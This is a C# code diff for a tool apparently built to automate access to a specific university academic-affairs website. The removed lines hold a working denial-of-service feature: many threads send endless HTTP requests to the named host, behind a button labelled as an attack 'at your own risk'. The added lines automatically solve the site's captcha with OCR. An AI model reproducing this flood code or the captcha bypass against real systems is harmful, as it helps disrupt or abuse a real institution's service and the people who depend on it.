@@ -138,34 +138,6 @@ namespace FuckJW2005
         {
             if (e.KeyChar == '\r' && goFuck.Enabled) goFuck.PerformClick();
         }
-        private void attackJW_Click(object sender, EventArgs e)
-        {
-            if (dosThd != null)
-            {
-                foreach (var item in dosThd)
-                {
-                    item.Abort();
-                }
-                dosThd = null;
-                attackJW.Text = "攻击教务系统\r\n(后果自负)";
-                AtkThdCount.Enabled = true;
-                return;
-            }
-
-
-            if (AtkThdCount.Value == 0) return;
-            AtkThdCount.Enabled = false;
-
-            dosThd = new Thread[(int)AtkThdCount.Value];
-            for (int i = 0; i < AtkThdCount.Value; i++)
-            {
-                dosThd[i] = new Thread(dosThdCallback);
-                dosThd[i].IsBackground = true;
-                dosThd[i].Name = "Dos攻击线程";
-                dosThd[i].Start();
-            }
-            attackJW.Text = "停止攻击";
-        }
         #endregion
 
         private string __VIEWSTATE = "";
@@ -245,6 +217,10 @@ namespace FuckJW2005
                 Invoke(new ThreadStart(delegate
                 {
                     captchaImg.Image = img;
+                    if (ocr_wrapper != null)
+                    {
+                        capcha.Text = ocr_wrapper.OCR_Image(img);
+                    }
                 }));
             }, headerParam: header_param);
         }
@@ -654,32 +630,25 @@ namespace FuckJW2005
         }
         #endregion
 
-        #region ddos jw system
-        private Thread[] dosThd;
-        private void dosThdCallback()
+
+        private ocr_project.OCR_Wrapper ocr_wrapper;
+        private void setPython_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
         {
-            try
+            var dlg = new OpenFileDialog();
+            dlg.Filter = "Python运行程序|python.exe|可执行程序|*.exe|所有文件|*.*";
+            if (dlg.ShowDialog() == DialogResult.OK)
             {
-                do
-                {
-                    var url = "http://jw2005.scuteo.com/";
-                    try
-                    {
-                        var ns = new NetStream();
-                        ns.HttpGet(url);
-                        ns.Close();
-                    }
-                    catch (ThreadAbortException) { throw; }
-                    catch (Exception)
-                    {
-                    }
-                } while (true);
-            }
-            catch (Exception)
-            {
+                var file = dlg.FileName;
+                ocr_wrapper = new ocr_project.OCR_Wrapper(file);
+                refresh_captcha();
             }
         }
-        #endregion
+
+        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
+        {
+            if (ocr_wrapper != null)
+                ocr_wrapper.Dispose();
+        }
     }
 
 }
